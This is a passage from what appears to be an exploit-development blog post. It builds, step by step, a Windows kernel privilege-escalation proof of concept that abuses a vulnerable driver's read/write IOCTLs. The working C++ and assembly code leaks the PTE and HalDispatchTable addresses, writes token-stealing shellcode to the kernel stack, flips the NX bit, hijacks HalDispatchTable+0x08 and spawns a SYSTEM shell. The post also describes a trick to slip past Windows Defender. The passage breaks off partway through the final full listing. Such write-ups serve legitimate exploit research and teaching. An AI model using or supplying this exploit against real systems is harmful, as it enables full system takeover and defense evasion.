<p><img src="/assets/images/post3-poc4-1.png" alt="post3-poc4-1.png" /></p>

<p>We know that the base address of NT changes across reboots due to KASLR. We verify the current NT base in WinDbg with:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lm m nt
</code></pre></div></div>

<p>We see that the base address of NT at 0xfffff806abc00000 matches the NT base address found in our POC.</p>

<p><img src="/assets/images/post3-windbg-poc4-1.png" alt="post3-windbg-poc4-1.png" /></p>

<p>We now need to find the PTE start address so that we can find the PTE entry of our KSTACK to make it executable to execute our shellcode. We know that the PTE start address is randomized at boot time and that the current start address can be found at nt!MiGetPteAddress+0x13. We could calculate the offset from NT base to nt!MiGetPteAddress+0x13, but we will go with a similar scan technique to match a pattern enabling us to find nt!MiGetPteAddress+0x13 when the offset from NT base changes across Windows versions. The leakPteBase() function takes the NT base address, a handle to the driver, and the read buffer as parameters. It uses a unique, static QWORD found at nt!MiGetPteAddress+0xb as the signature to find. This is the assembly code in the MiGetPteAddress() function before the PTE start address is listed. We adjust out NT base address by adding 0x40000b to get us alligned back to the section where we can find nt!MiGetPteAddress and start searching for the signature. We read the QWORD at the address and if it does not match the signature we then skip a QWORD and read the next QWORD. When the signature is found we add 0x08 to find the address of nt!MiGetPteAddress+0x13. We add the leakPteBase() function call to the end of the main() function just before the return.</p>

<pre><code class="language-C++">...

ULONGLONG leakPteBase(ULONGLONG ntBase, HANDLE driver, PULONGLONG readBuf)
{

    ULONGLONG pteBaseAddr;
    unsigned char signature[] = { 0x00, 0x00, 0x00, 0x48, 0x23, 0xc8, 0x48, 0xb8 };
    ULONGLONG searchAddr = (ntBase + 0x40000b);

    while (TRUE)
    {
        ULONGLONG readData = readQWORD(searchAddr, driver, readBuf);
        ULONGLONG tmp = readData;
        int comp;
        comp = memcmp(signature, &amp;tmp, sizeof(ULONGLONG));
        if (comp == 0)
        {
            pteBaseAddr = readQWORD(searchAddr + 0x08, driver, readBuf);
            break;
        }
        searchAddr = searchAddr + 0x10;
    }
    return pteBaseAddr;
}

int main()
{

...

    ULONGLONG pteBase = leakPteBase(ntBase, apexHandle, readBuf);
    printf("[+] PTE Base Address: 0x%llx\n", pteBase);

    return 0;
}
</code></pre>

<p>We use WinDbg to verify our logic and pull the current PTE start address to validate our POC.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>u nt!MiGetPteAddress

dqs nt!MiGetPteAddress+0xb L2

dqs nt!MiGetPteAddress+0x13 L1
</code></pre></div></div>

<p><img src="/assets/images/post3-windbg-poc5-2.png" alt="post3-windbg-poc5-2.png" /></p>

<p><img src="/assets/images/post3-windbg-poc5-1.png" alt="post3-windbg-poc5-1.png" /></p>

<p>Compile the POC and then execute it on the test VM.</p>

<p><img src="/assets/images/post3-poc5-1.png" alt="post3-poc5-1.png" />
We can see that the POC retrieved the correct PTE start address of 0cffffe08000000000. This completes item 5 on our list. We now move on to item 6 to find our Kernel StackBase for our thread and then find the PTE for the Kernel Stack. The getPteAddress() function takes a virtual memory address and the PTE start/base address as parameters. It then performs the calculations necessary to find the PTE address for the provided virtual address by right shifting the address by 9. Then or it with the PTE base address, then and it with the PTE base address + 0x0000007ffffffff8. We determine our KSTACK base address in the main() function by using the read primitive to read the QWORD at KTHREAD+0x38. We then subtract 0x100 to ensure we have an address that is on the Kernel Stack and near the base. We then pass this address to the getPteAddress() function to retreive the PTE address of the Kernel Stack. We include a call to getchar() before the return so that we can verify our Kernel Stack base address and the PTE for the Kerenel Stack before the POC exits.</p>

<pre><code class="language-C++">...

ULONGLONG getPteAddress(ULONGLONG addr, ULONGLONG pteBase)
{
    ULONGLONG result = addr &gt;&gt; 9;
    result = result | pteBase;
    result = result &amp; (pteBase + 0x0000007ffffffff8);
    return result;
}

int main()
{

...

    ULONGLONG kStack = readQWORD(kThread + 0x38, apexHandle, readBuf);
    printf("[+] Kernel Stack Base: 0x%llx\n", kStack);

    kStack = kStack - 0x100;

    ULONGLONG kStackPte = getPteAddress(kStack, pteBase);
    printf("[+] PTE Addres of KStack: 0x%llx\n", kStackPte);
    getchar();
    
    return 0;
}
</code></pre>

<p>Compile the latest POC and then execute it on the test VM. We will see a kernel-mode address printed to the screen for the Kernel Stack base and for the PTE of the Kerenel Stack.</p>

<p><img src="/assets/images/post3-poc6-1.png" alt="post3-poc6-1.png" /></p>

<p>We then switch back to WinDbg to verify the kernel-mode addresses are correct. We use the following commands in Windbg to confirm our output is correct (remember to replaces addresses with the ones from your output):</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>!process 0 0

!process ffff9b86044e00c0

dt -v nt!_KTHREAD ffff9b8608c55080

!pte 0xffffba8d`90ce7000-0x100
</code></pre></div></div>

<p><img src="/assets/images/post3-windbg-poc6-1.png" alt="post3-windbg-poc6-1.png" /></p>

<p><img src="/assets/images/post3-windbg-poc6-2.png" alt="post3-windbg-poc6-2.png" /></p>

<p><img src="/assets/images/post3-windbg-poc6-3.png" alt="post3-windbg-poc6-3.png" /></p>

<p>We will once again resume execution in the debugger with the g command and hit enter on the test VM to ensure the POC exits cleanly and does not generate a bugcheck. We then move on to item 7 to copy our token stealing shellcode to the Kernel Stack. Our Visual Studio project for our POC needs some changes to support compiling the shellcode. Right click on the assvd_user project, then select build dependencies, then select build customizations. Select the masm build custimization. Then right click on the project and add -&gt; new item. Name the new item token_stealing.asm.</p>

<p><img src="/assets/images/post3-visual-studio-masm-1.png" alt="post3-visual-studio-masm-1.png" /></p>

<p><img src="/assets/images/post3-visual-studio-masm-2.png" alt="post3-visual-studio-masm-2.png" /></p>

<p><img src="/assets/images/post3-visual-studio-masm-3.png" alt="post3-visual-studio-masm-3.png" /></p>

<p>We then add our token stealing shellcode to the token_stealing.asm file. The TokenStealing PROC label at the top needs to match what we import in the C code in the main POC. The shellcode starts with saving the values of the registers we use so that they can be restored later to continue execution. It then pulls the current EPROCESS address by pulling the address at offset 0x188 in the gs register and then dereferencing offset 0xb8 from that address. We then loop through the active process links at offset 0x1d8 in the EPROCESS structure to check the UniqueProcessId at offset 0x1d0 in the EPROCESS structure to see if it equals PID 4, which is the PID of the SYSTEM process. We continue moving to the next process in the ActiveProcessList until we find the SYSTEM process. We then take the token located at offset 0x248 in the SYSTEM process EPROCESS structure and copy it over our token at offset 0x248 in our own process EPROCESS structure. This elevates our process’s privileges to SYSTEM. We then restore the registers to their orginal values and load the legitimate address of nt!HaliQuerySystemInformation in to rax and jmp rax to restore the hijacked execution flow of the nt!HalDispatchTable+0x08.</p>

<pre><code class="language-assembly">_TEXT	SEGMENT

TokenStealing PROC
	get_eproc:
	nop
	nop
	nop
	nop
	nop
	push	rax										;save registers
	push	rcx										;
	push	r9										;
	push	r8										;
	xor     rax, rax								;Get the EPROCESS of current Process
	mov     rax, qword ptr gs:[rax+188h]			;
	mov     rax, qword ptr [rax+0B8h]				;
	mov     r8, rax									;
	parse_eproc:
	mov     rax, qword ptr [rax+1d8h]				;walk the linked process list to find SYSTEM process
	sub     rax, 1d8h								;
	mov     rcx, qword ptr [rax+1d0h]				;
	cmp     rcx, 4									;
	jne     parse_eproc								;
	steal_token:
	mov     r9, qword ptr [rax+248h]				;copy SYSTEM process token to current process
	mov     qword ptr [r8+248h], r9					;
	pop		r8										;restore registers
	pop		r9										;
	pop		rcx										;
	pop		rax										;we are about to overwrite this one but stack allignment is a thing
	mov		rax, qword ptr [2b000000h]				;HaliQuerySystemInformation
	jmp		rax
	ret

TokenStealing ENDP

_TEXT	ENDS

End
</code></pre>

<p>Our POC’s C code starts with importing the TokenStealing() shellcode with the extern statement below our structure offset define statements. Our Kernel Stack is in kernel-mode address space so we need our write primitive to write our shellcode to it. We add in the writeQWORD() function definition before the main() function. The writeQWORD() function takes an address to write to, a handle to the driver, the read buffer, and the value to write as parameters. It then sets up the I/O request to the write primitive IOCTL using the provided parameters. We then write the shellcode to the Kernel Stack one QWORD at a time in the main() function with calls to the writeQWORD() function. We then allocate user-mode memory to store the legitimate address of nt!HaliQuerySystemInformation. We pause with getchar() to validate that we successfully wrote our shellcode to the Kernel Stack.</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
</span>
<span class="cp">#define EPROCESS_ThreadListHead_Offset 0x370
#define ETHREAD_ThreadListEntry_Offset 0x578
#define ETHREAD_Tcb_Offset             0x000
#define ETHREAD_Cid_Offset             0x508
#define CLIENTID_UniqueThread_Offset   0x8
</span>
<span class="k">extern</span> <span class="s">"C"</span> <span class="kt">void</span> <span class="nf">TokenStealing</span><span class="p">();</span>

<span class="p">...</span>

<span class="n">VOID</span> <span class="nf">writeQWORD</span><span class="p">(</span><span class="n">ULONGLONG</span> <span class="n">addr</span><span class="p">,</span> <span class="n">HANDLE</span> <span class="n">driver</span><span class="p">,</span> <span class="n">PULONGLONG</span> <span class="n">readBuf</span><span class="p">,</span> <span class="n">ULONGLONG</span> <span class="n">what</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">ULONG</span> <span class="n">IoControlCode</span> <span class="o">=</span> <span class="mh">0x223c04</span><span class="p">;</span>
    <span class="n">PULONGLONG</span> <span class="n">inBuf</span> <span class="o">=</span> <span class="n">readBuf</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">inBufLength</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">;</span>
    <span class="n">PULONGLONG</span> <span class="n">outBuf</span> <span class="o">=</span> <span class="p">((</span><span class="n">PULONGLONG</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">readBuf</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">));</span>
    <span class="n">ULONG</span> <span class="n">outBufLength</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">);</span>
    <span class="n">ULONG</span> <span class="n">lpBytesReturned</span><span class="p">;</span>

    <span class="p">((</span><span class="n">PULONGLONG</span><span class="p">)</span><span class="n">inBuf</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">addr</span><span class="p">;</span>
    <span class="p">((</span><span class="n">PULONGLONG</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">inBuf</span> <span class="o">+</span> <span class="mh">0x08</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">what</span><span class="p">;</span>


    <span class="n">BOOL</span> <span class="n">triggerIOCTL</span><span class="p">;</span>
    <span class="n">triggerIOCTL</span> <span class="o">=</span> <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">driver</span><span class="p">,</span> <span class="n">IoControlCode</span><span class="p">,</span> <span class="n">inBuf</span><span class="p">,</span> <span class="n">inBufLength</span><span class="p">,</span> <span class="n">outBuf</span><span class="p">,</span> <span class="n">outBufLength</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">lpBytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">triggerIOCTL</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printLastErrorMessage</span><span class="p">(</span><span class="s">"[!] Failed to write QWORD"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">ULONGLONG</span> <span class="n">result</span> <span class="o">=</span> <span class="n">outBuf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="k">return</span><span class="p">;</span>

<span class="p">}</span>

<span class="kt">int</span> <span class="n">main</span><span class="p">()</span>
<span class="p">{</span>

<span class="p">...</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Writing shellcode to Kernel Stack.....</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">ULONGLONG</span><span class="o">*</span> <span class="n">tokensteal</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="o">*</span><span class="p">)</span><span class="n">TokenStealing</span><span class="p">;</span>
    <span class="n">ULONGLONG</span> <span class="n">writeWhat</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="n">writeQWORD</span><span class="p">(</span><span class="n">kStack</span><span class="p">,</span> <span class="n">apexHandle</span><span class="p">,</span> <span class="n">readBuf</span><span class="p">,</span> <span class="n">writeWhat</span><span class="p">);</span>
    <span class="n">writeWhat</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
    <span class="n">writeQWORD</span><span class="p">(</span><span class="n">kStack</span> <span class="o">+</span> <span class="mh">0x08</span><span class="p">,</span> <span class="n">apexHandle</span><span class="p">,</span> <span class="n">readBuf</span><span class="p">,</span> <span class="n">writeWhat</span><span class="p">);</span>
    <span class="n">writeWhat</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
    <span class="n">writeQWORD</span><span class="p">(</span><span class="n">kStack</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">,</span> <span class="n">apexHandle</span><span class="p">,</span> <span class="n">readBuf</span><span class="p">,</span> <span class="n">writeWhat</span><span class="p">);</span>
    <span class="n">writeWhat</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
    <span class="n">writeQWORD</span><span class="p">(</span><span class="n">kStack</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">,</span> <span class="n">apexHandle</span><span class="p">,</span> <span class="n">readBuf</span><span class="p">,</span> <span class="n">writeWhat</span><span class="p">);</span>
    <span class="n">writeWhat</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
    <span class="n">writeQWORD</span><span class="p">(</span><span class="n">kStack</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">,</span> <span class="n">apexHandle</span><span class="p">,</span> <span class="n">readBuf</span><span class="p">,</span> <span class="n">writeWhat</span><span class="p">);</span>
    <span class="n">writeWhat</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
    <span class="n">writeQWORD</span><span class="p">(</span><span class="n">kStack</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">,</span> <span class="n">apexHandle</span><span class="p">,</span> <span class="n">readBuf</span><span class="p">,</span> <span class="n">writeWhat</span><span class="p">);</span>
    <span class="n">writeWhat</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>
    <span class="n">writeQWORD</span><span class="p">(</span><span class="n">kStack</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">,</span> <span class="n">apexHandle</span><span class="p">,</span> <span class="n">readBuf</span><span class="p">,</span> <span class="n">writeWhat</span><span class="p">);</span>
    <span class="n">writeWhat</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">7</span><span class="p">];</span>
    <span class="n">writeQWORD</span><span class="p">(</span><span class="n">kStack</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">,</span> <span class="n">apexHandle</span><span class="p">,</span> <span class="n">readBuf</span><span class="p">,</span> <span class="n">writeWhat</span><span class="p">);</span>
    <span class="n">writeWhat</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
    <span class="n">writeQWORD</span><span class="p">(</span><span class="n">kStack</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">,</span> <span class="n">apexHandle</span><span class="p">,</span> <span class="n">readBuf</span><span class="p">,</span> <span class="n">writeWhat</span><span class="p">);</span>
    <span class="n">writeWhat</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">9</span><span class="p">];</span>
    <span class="n">writeQWORD</span><span class="p">(</span><span class="n">kStack</span> <span class="o">+</span> <span class="mh">0x48</span><span class="p">,</span> <span class="n">apexHandle</span><span class="p">,</span> <span class="n">readBuf</span><span class="p">,</span> <span class="n">writeWhat</span><span class="p">);</span>
    <span class="n">writeWhat</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
    <span class="n">writeQWORD</span><span class="p">(</span><span class="n">kStack</span> <span class="o">+</span> <span class="mh">0x50</span><span class="p">,</span> <span class="n">apexHandle</span><span class="p">,</span> <span class="n">readBuf</span><span class="p">,</span> <span class="n">writeWhat</span><span class="p">);</span>
    <span class="n">writeWhat</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">11</span><span class="p">];</span>
    <span class="n">writeQWORD</span><span class="p">(</span><span class="n">kStack</span> <span class="o">+</span> <span class="mh">0x58</span><span class="p">,</span> <span class="n">apexHandle</span><span class="p">,</span> <span class="n">readBuf</span><span class="p">,</span> <span class="n">writeWhat</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Allocating memory for HalDispatchTable restore.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">PULONGLONG</span> <span class="n">restoreBuf</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONGLONG</span><span class="p">)</span><span class="n">VirtualAlloc</span><span class="p">((</span><span class="n">PULONGLONG</span><span class="p">)</span><span class="mh">0x000000002b000000</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">readBuf</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printLastErrorMessage</span><span class="p">(</span><span class="s">"[!] Failed to allocate buffer memory"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">memset</span><span class="p">((</span><span class="n">PULONGLONG</span><span class="p">)</span><span class="mh">0x000000002b000000</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
    <span class="n">getchar</span><span class="p">();</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Compile the POC code and execute it on the test VM. Hit enter after the first getchar() call and switch to the debugger on the second getchar() call.</p>

<p><img src="/assets/images/post3-poc7-1.png" alt="post3-poc7-1.png" /></p>

<p>Look up our process in WinDbg, pull the Kernel StackBase address and verify that it contains our shellcode (remember to replaces address with the ones from your output):</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>!process 0 0

!process ffff9b8604f9c0c0

dt nt!_KTHREAD ffff9b8607edc0c0 StackBase

u 0xffffba8d`91950000-0x100 L20
</code></pre></div></div>

<p><img src="/assets/images/post3-windbg-poc7-1.png" alt="post3-windbg-poc7-1.png" /></p>

<p><img src="/assets/images/post3-windbg-poc7-2.png" alt="post3-windbg-poc7-2.png" /></p>

<p><img src="/assets/images/post3-windbg-poc7-3.png" alt="post3-windbg-poc7-3.png" /></p>

<p>We can see that our shellcode is stored on the Kernel Stack for our process. Resume execution in WinDbg with the g command and then hit enter on the test VM to ensure the POC exists cleanly and does not generate a bugcheck. We move on now to item 8 to flip the NX bit on the PTE for our Kernel Stack to mark it as executable. this is a good time to remind everyone that we have VBS/HVCI disabled for this portion of the demo. HVCI would prevent us from executing dynamic code. We update our POC to pull the PTE entry of the Kernel Stack. I added this right after we pulled the PTE address for the Kernel Stack to help with the flow of the code to make sense/readability. We then jump down to the end of the main() function and adjust the PTE value to make it executable and then write that value to the PTE. We make it executable by taking the integer 1 as a 64-bit unsigned long long QWORD and left shifting it by 63. We then XOR this with the PTE value to flip the NX bit. We then pause to allow us to check the results in WinDbg.</p>

<pre><code class="language-C++">...

int main()
{

...

    ULONGLONG kStackPteVa = getPteAddress(kStack, pteBase);
    printf("[+] PTE Address of Kernel Stack: 0x%llx\n", kStackPteVa);
    ULONGLONG kStackPte = readQWORD(kStackPteVa, apexHandle, readBuf);
    printf("[+] PTE Entry of Kernel Stack: 0x%llx\n", kStackPte);
    getchar();

...

   printf("[+] Flipping NX bit on Kstack...\n");
   writeWhat = kStackPte ^ (1ULL &lt;&lt; 63);
   writeQWORD(kStackPteVa, apexHandle, readBuf, writeWhat);
   ULONGLONG newkStackPte = readQWORD(kStackPteVa, apexHandle, readBuf);
   printf("[+] Modified PTE Entry of Kernel Stack: 0x%llx\n", newkStackPte);
   getchar();

    return 0;
}
</code></pre>

<p>Compile the updated POC and execute it on the test VM. Pause after the memory is allocated for the HalDispatchTable restore to check the PTE for the Kernel Stack to see that it the NX bit is currently set.</p>

<p><img src="/assets/images/post3-poc8-1.png" alt="post3-poc8-1.png" /></p>

<p>Remember to replaces addresses with the ones from your output.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>!process 0 0

!process ffff9b8609fb4080

dt nt!_KTHREAD ffff9b860677b080 StackBase

!pte 0xffffba8d`93270000-0x100-0x100
</code></pre></div></div>

<p><img src="/assets/images/post3-windbg-poc8-1.png" alt="post3-windbg-poc8-1.png" /></p>

<p>Notice that PTE on the far right has —DA–KW-V showing that it is not executable.</p>

<p><img src="/assets/images/post3-windbg-poc8-2.png" alt="post3-windbg-poc8-2.png" /></p>

<p>Resume execution in WinDbg with the g command. Press enter on the test VM to flip the NX bit on our Kernel Stack and then pause to verify the PTE is now marked as executable. We can see from the ouput on the test VM that the NX bit appears to be flipped as the leading bit of the PTE entry is no longer set. The addresses will remain the same since the thread and process have not exited yet so we only need to rerun the !pte command in WinDbg to confirm that it is indeed executable now.</p>

<p><img src="/assets/images/post3-poc8-2.png" alt="post3-poc8-2.png" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>!pte 0xffffba8d`93270000-0x100-0x100
</code></pre></div></div>

<p>Notice that the PTE is now —DA–KWEV showing that it is executable.</p>

<p><img src="/assets/images/post3-windbg-poc8-3.png" alt="post3-windbg-poc8-3.png" /></p>

<p>Resume execution in WinDbg with the g command and press enter on the test VM to ensure the POC exists cleanly and does not generate a bugcheck. We will now move on to item 9 and find the HalDispatchTable by scanning up from the NT base address. I put the leakHalDispatchTable() function below the other leak functions just to group them together.  The leakHalDispatchTable() function takes the NT base address, a handle to the driver, and the read buffer as parameters. It operates very similar to the leakPteBase() function but uses a signature that is 3 QWORDS long. If we dump the HalDispatchTable in WinDbg we will that the first QWORD is 0x06 and that it is proceeded by at least two QWORDS of 0x00 giving us three QWORDS of 0x00, 0x00, and 0x06. This turns out to be unique enough to find the HalDispatchTable. We call the leakHalDispatchTable() function in the main() function and then read the QWORD at HalDispatchTable+0x08 with the read primitive to retrieve the address of nt!HaliQuerySystemInformation.</p>

<pre><code class="language-C++">...

ULONGLONG leakHalDispatchTable(ULONGLONG ntBase, HANDLE driver, PULONGLONG readBuf)
{

    ULONGLONG halDispatchTableAddr;
    unsigned char signature[0x18] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    ULONGLONG searchAddr = (ntBase + 0xe00000);

    while (TRUE)
    {
        ULONGLONG readData = readQWORD(searchAddr, driver, readBuf);
        unsigned char tmp[0x18];
        memcpy(tmp, &amp;readData, sizeof(ULONGLONG));
        readData = readQWORD(searchAddr + 0x08, driver, readBuf);
        memcpy(tmp + 0x08, &amp;readData, sizeof(ULONGLONG));
        readData = readQWORD(searchAddr + 0x10, driver, readBuf);
        memcpy(tmp + 0x10, &amp;readData, sizeof(ULONGLONG));
        int comp;
        comp = memcmp(signature, tmp, 0x18);
        if (comp == 0)
        {
            halDispatchTableAddr = searchAddr + 0x10;//readQWORD(searchAddr + 0x18, driver, readBuf);
            break;
        }
        searchAddr = searchAddr + 0x10;
    }
    return halDispatchTableAddr;
}

...

int main()
{
...

   ULONGLONG halDispatchTable = leakHalDispatchTable(ntBase, apexHandle, readBuf);
   printf("[+] found HalDispatchTable at: 0x%llx\n", halDispatchTable);
   ULONGLONG haliQuerySystemInformation = readQWORD(halDispatchTable + 0x08, apexHandle, readBuf);
   printf("[+] HaliQuerySystemInformaton Address: 0x%llx\n", haliQuerySystemInformation);
   getchar();
   
   return 0;
}
</code></pre>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dqs nt!HalDispatchTable-0x10
</code></pre></div></div>

<p><img src="/assets/images/post3-windbg-poc9-1.png" alt="post3-windbg-poc9-1.png" /></p>

<p>We now have the address of nt!HaliQuerySystemInformation to verify that our POC works correctly while also verifying our signature that we search for to find the HalDispatchTable. Compile the POC and execute it on the test VM. Hit enter at each getchar() pause as we have already pulled the information we need to verify proper operation. We can see that the POC successfully found the nt!HalDispatchTable and correctly identified the address of nt!HaliQuerySystemInformation at nt!HalDispatchTale+0x08.</p>

<p><img src="/assets/images/post3-poc9-1.png" alt="post3-poc9-1.png" /></p>

<p>We can now finish our POC by completing items 10, 11, 12, and 13. We add the typedef for NtQueryIntervalProfile after our define statements so that we can call NtQueryIntervalProfile in the main() function after we overwrite the nt!HaliQuerySystemInformation entry in the nt!HalDispatchTable at offset 0x08. We add the rest of the code at the end of the main() function. We copy the address of nt!HaliQuerySystemInformation to our restore buffer so that the shellcode can continue execution flow back to the proper location after executing. We overwrite nt!HalDispatchTable+0x08 with our shellcode address by using the write primitive. We then obtain a pointer to NtQueryIntervalProfile using GetProcAddress(). We call NtQueryIntervalProfile and then sleep for two seconds to allow execution of our shellcode to complete. We then restore the nt!HalDispatchTable+0x08 to its original state. We then setup a const char* string with the value “start cmd.exe” that we then pass to the system() function. Windows defender will block the spawning of the system shell if we use system(“start cmd..exe”), but we can bypass the detection by passing the constant instead of the string itself. We then release the memory we allocated in our POC and close the handle to the driver in an effort to write better code and clean up after ourselves.</p>

<pre><code class="language-C++">#include &lt;iostream&gt;
#include &lt;Windows.h&gt;

#define EPROCESS_ThreadListHead_Offset 0x370
#define ETHREAD_ThreadListEntry_Offset 0x578
#define ETHREAD_Tcb_Offset             0x000
#define ETHREAD_Cid_Offset             0x508
#define CLIENTID_UniqueThread_Offset   0x8

typedef NTSTATUS(WINAPI* _NtQueryIntervalProfile)(
    DWORD junk,
    PULONG buffer
    );

extern "C" void TokenStealing();

...

int main()
{

...

   restoreBuf[0] = haliQuerySystemInformation;
   printf("[+] Hijacking HaliQuerySystemInformation...\n");
   writeQWORD(halDispatchTable + 0x08, apexHandle, readBuf, kStack);

   _NtQueryIntervalProfile pNtQueryIntervalProfile = (_NtQueryIntervalProfile)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryIntervalProfile");
   if (!pNtQueryIntervalProfile)
   {
       printLastErrorMessage("[!] Error while resolving NtQueryIntervalProfile");
       exit(1);
   }
   ULONG trash;
   pNtQueryIntervalProfile(2, &amp;trash);
   Sleep(2000);

   writeQWORD(halDispatchTable + 0x08, apexHandle, readBuf, haliQuerySystemInformation);
   const char* notcmd = "start cmd.exe";

   system(notcmd);
   
       if (!VirtualFree(readBuf, 0, MEM_RELEASE))
    {
        printLastErrorMessage("[!] Release of readBuf failed");
        return 1;
    }

    if (!VirtualFree(restoreBuf, 0, MEM_RELEASE))
    {
        printLastErrorMessage("[!] Release of restoreBuf failed");
        return 1;
    }

    if (!CloseHandle(apexHandle))
    {
        printLastErrorMessage("[!] Release of driver handle failed");
        return 1;
    }

   return 0;
}

</code></pre>

<p>Compile the final POC code and execute it on the test VM. You should receive a SYSTEM shell after the POC completes. Do not forget to hit enter after the getchar() calls or comment them out so that the POC finishes.</p>

<p><img src="/assets/images/post3-poc10-1.png" alt="post3-poc10-1.png" /></p>

<p>Here is the complete final POC code for the nt!HalDispatchTable hijack version of this exploit:</p>

<pre><code class="language-C++">#include &lt;iostream&gt;
#include &lt;Windows.h&gt;

#define EPROCESS_ThreadListHead_Offset 0x370
#define ETHREAD_ThreadListEntry_Offset 0x578
#define ETHREAD_Tcb_Offset             0x000
#define ETHREAD_Cid_Offset             0x508
#define CLIENTID_UniqueThread_Offset   0x8

typedef NTSTATUS(WINAPI* _NtQueryIntervalProfile)(
    DWORD junk,
    PULONG buffer
    );

extern "C" void TokenStealing();

void printLastErrorMessage(const char* customMessage) {
    DWORD errorCode = GetLastError(); // Retrieve the last error code
    if (errorCode == 0) {
        printf("%s: No error.\n", customMessage);
        return;
    }

    LPVOID errorMsgBuffer = NULL;

    // Format the error message from the system
    DWORD size = FormatMessageA(
